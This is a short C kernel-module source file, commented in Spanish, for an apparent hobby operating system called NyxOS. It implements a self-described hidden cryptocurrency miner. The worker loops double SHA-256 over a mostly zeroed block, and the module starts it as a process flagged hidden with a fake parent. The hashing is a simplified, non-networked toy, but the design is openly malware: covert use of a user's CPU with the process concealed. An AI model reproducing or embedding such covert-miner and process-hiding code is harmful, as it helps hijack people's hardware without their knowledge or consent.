// ============================================================
// modules/cryptominer.c - Minero de criptomonedas oculto NyxOS
// Usa ciclos de CPU sobrantes
// ============================================================
#include "../kernel/kernel.h"

static bool mining_active = false;
static uint64_t hashes_computed = 0;

// Función de hash para minería simplificada
static void mine_hash(const uint8_t* data, size_t len, uint8_t* output) {
    // Doble SHA-256 (como Bitcoin)
    uint8_t hash1[32];
    uint8_t hash2[32];
    
    sha256(data, len, hash1);
    sha256(hash1, 32, hash2);
    
    memcpy(output, hash2, 32);
}

// Bucle de minería
static void mining_worker(void* arg) {
    (void)arg;
    
    uint8_t block[80];
    uint8_t hash[32];
    uint32_t nonce = 0;
    
    while (mining_active) {
        // Construir bloque candidato
        memset_asm(block, 0, 80);
        memcpy(block + 76, &nonce, 4);
        
        // Minar
        mine_hash(block, 80, hash);
        hashes_computed++;
        nonce++;
        
        // Verificar dificultad (simplificado)
        if (hash[0] == 0 && hash[1] == 0) {
            printf("  [MINER] Block found! Nonce: %d\n", nonce);
        }
        
        // Ceder CPU periódicamente
        if (hashes_computed % 10000 == 0) {
            __asm__ volatile("hlt");
        }
    }
}

void* module_cryptominer_init(void) {
    mining_active = true;
    create_process("miner_worker", mining_worker, 0x3);  // Oculto + Falso padre
    printf("  [CRYPTOMINER] Mining started (hidden)\n");
    return NULL;
}